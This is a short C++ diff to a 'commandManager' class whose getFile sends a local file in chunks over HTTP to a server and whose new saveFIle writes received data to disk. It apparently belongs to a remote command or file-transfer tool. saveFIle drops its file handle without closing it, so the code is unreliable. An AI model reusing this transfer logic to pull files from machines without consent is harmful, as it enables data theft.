@@ -163,8 +163,6 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
     dataFrame->type = ftpResponse;
     dataFrame->seq = 0;
 
-
-
     fopen_s(&fp, path.c_str(), "rb+");
     if (fp) {
         while (!feof(fp)) {
@@ -188,7 +186,7 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
             else if (sequence != 0 && size < DATA_BUF_SIZE) {
                 sequence++;
                 dataFrame->len = size;
-                dataFrame->seq = LAST_SEQUENCE;
+                dataFrame->seq = LAST_SPLITED_SEQ;
                 std::cout << dataFrame->seq << std::endl;
                 memcpy(buffer, dataFrame, sizeof(DDprotocol));
                 client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
@@ -210,3 +208,15 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
 
 }
 
+void commandManager::saveFIle(std::string& path, std::string& data, DWORD seq) {
+    if (!this->fp) {
+        fopen_s(&this->fp, path.c_str(), "wb+");
+    }
+
+    fwrite(data.c_str(), 1, data.length(), this->fp);
+
+    if (seq == NOT_SPLITED_SEQ || seq == LAST_SPLITED_SEQ) {
+        this->fp = NULL;
+    }
+       
+}
